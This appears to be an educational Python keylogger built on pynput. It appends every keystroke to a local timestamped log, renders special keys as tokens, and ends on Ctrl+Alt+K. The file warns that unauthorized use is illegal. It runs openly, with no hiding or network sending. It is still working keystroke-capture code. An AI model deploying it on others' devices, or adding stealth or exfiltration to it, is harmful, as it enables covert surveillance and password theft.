"""
Educational Python Keylogger
============================

A simple cross-platform keystroke logger that writes typed characters
to a local text file. Built for learning how operating systems expose
global input events to user-space programs.

ETHICAL USE ONLY
----------------
Only run this on devices you own, or where you have received explicit
written permission from the owner. Unauthorized keystroke logging is
illegal in most jurisdictions (e.g., the US Computer Fraud and Abuse
Act, the UK Computer Misuse Act, EU GDPR, etc.).

Design notes
------------
- Uses `pynput.keyboard.Listener`, which hooks the OS-level input
  subsystem in a background thread and invokes callbacks on events.
- Tracks currently-pressed keys in a set so we can detect a
  multi-key "stop" combo (Ctrl + Alt + K by default).
- Formats special keys (Enter, Tab, Backspace, arrows, ...) as
  readable tokens so the resulting log is human-skimmable.
- Writes to disk on every keystroke. This is simple and durable but
  not performant — an educational trade-off. A production tool would
  buffer writes.
"""

from __future__ import annotations

from datetime import datetime
from pathlib import Path
from typing import Iterable, Optional

from pynput import keyboard


# ---------------------------------------------------------------------------
# Key-set helpers
# ---------------------------------------------------------------------------
# pynput exposes a different set of Key members depending on platform
# (e.g. `cmd_l` exists on macOS but not on every Linux build). We build the
# modifier set defensively via getattr so the module imports cleanly anywhere.


def _collect_keys(names: Iterable[str]) -> set:
    """Return the subset of `keyboard.Key` members named in `names`."""
    out = set()
    for name in names:
        key = getattr(keyboard.Key, name, None)
        if key is not None:
            out.add(key)
    return out


CTRL_KEYS = _collect_keys(["ctrl", "ctrl_l", "ctrl_r"])
ALT_KEYS = _collect_keys(["alt", "alt_l", "alt_r", "alt_gr"])
SHIFT_KEYS = _collect_keys(["shift", "shift_l", "shift_r"])
CMD_KEYS = _collect_keys(["cmd", "cmd_l", "cmd_r"])
LOCK_KEYS = _collect_keys(["caps_lock", "num_lock", "scroll_lock"])

# Keys we never log on their own — they are either modifiers, or locks that
# don't carry content. We still *track* them (in `_pressed`) so we can
# detect combos like Ctrl+Alt+K.
MODIFIER_KEYS = CTRL_KEYS | ALT_KEYS | SHIFT_KEYS | CMD_KEYS | LOCK_KEYS

# Human-friendly rendering for non-printable keys.
SPECIAL_KEY_MAP = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
    keyboard.Key.backspace: "[BACKSPACE]",
    keyboard.Key.delete: "[DEL]",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.up: "[UP]",
    keyboard.Key.down: "[DOWN]",
    keyboard.Key.left: "[LEFT]",
    keyboard.Key.right: "[RIGHT]",
    keyboard.Key.home: "[HOME]",
    keyboard.Key.end: "[END]",
    keyboard.Key.page_up: "[PGUP]",
    keyboard.Key.page_down: "[PGDN]",
}


# ---------------------------------------------------------------------------
# KeyLogger
# ---------------------------------------------------------------------------


class KeyLogger:
    """Capture keystrokes and append them to a timestamped log file.

    Parameters
    ----------
    log_dir:
        Directory where log files are written. Created if missing.
    filename:
        Optional fixed filename. If omitted, a timestamped filename is used.
    stop_char:
        Character that, together with Ctrl and Alt, ends the session.
        Default is ``'k'`` → press Ctrl+Alt+K to stop.
    """

    def __init__(
        self,
        log_dir: Path | str = "logs",
        filename: Optional[str] = None,
        stop_char: str = "k",
    ) -> None:
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)

        if filename is None:
            stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"keylog_{stamp}.txt"

        self.log_file = self.log_dir / filename
        self.stop_char = stop_char.lower()

        self._pressed: set = set()
        self._key_count: int = 0
        self._started_at: Optional[datetime] = None

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _is_stop_combo(self) -> bool:
        """True when Ctrl + Alt + <stop_char> are all currently held."""
        ctrl_down = any(k in self._pressed for k in CTRL_KEYS)
        alt_down = any(k in self._pressed for k in ALT_KEYS)
        stop_down = any(
            isinstance(k, keyboard.KeyCode)
            and getattr(k, "char", None) is not None
            and k.char.lower() == self.stop_char
            for k in self._pressed
        )
        return ctrl_down and alt_down and stop_down

    def _format_key(self, key) -> str:
        """Return a string representation for the log file, or '' to skip."""
        if key in MODIFIER_KEYS:
            return ""  # don't spam the log with bare modifier presses

        if key in SPECIAL_KEY_MAP:
            return SPECIAL_KEY_MAP[key]

        # Printable characters come through as KeyCode with a `char`.
        if isinstance(key, keyboard.KeyCode) and key.char is not None:
            return key.char

        # Fall-through: name-only keys (F-keys, media keys, etc.)
        name = getattr(key, "name", None) or str(key).replace("Key.", "")
        return f"[{name.upper()}]"

    def _append(self, text: str) -> None:
        """Append `text` to the log file. Opens-per-write for durability."""
        with open(self.log_file, "a", encoding="utf-8") as fh:
            fh.write(text)

    # ------------------------------------------------------------------
    # pynput callbacks
    # ------------------------------------------------------------------

    def _on_press(self, key):
        self._pressed.add(key)

        if self._is_stop_combo():
            footer = (
                f"\n\n=== Session ended {datetime.now():%Y-%m-%d %H:%M:%S} "
                f"({self._key_count} keystrokes captured) ===\n"
            )
            self._append(footer)
            print(f"\n[!] Stop combo detected. Log saved to: {self.log_file}")
            print(f"[!] Captured {self._key_count} keystrokes.")
            return False  # returning False from on_press stops the listener

        token = self._format_key(key)
        if token:
            self._append(token)
            self._key_count += 1

    def _on_release(self, key):
        # Keep the pressed-set accurate so combos aren't "sticky".
        self._pressed.discard(key)

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(self) -> None:
        """Block the current thread and log keystrokes until the stop combo."""
        self._started_at = datetime.now()
        header = (
            f"=== Session started {self._started_at:%Y-%m-%d %H:%M:%S} ===\n"
        )
        self._append(header)

        print(f"[*] Keylogger running. Log file: {self.log_file}")
        print(f"[*] Press Ctrl+Alt+{self.stop_char.upper()} to stop.\n")

        with keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release,
        ) as listener:
            listener.join()
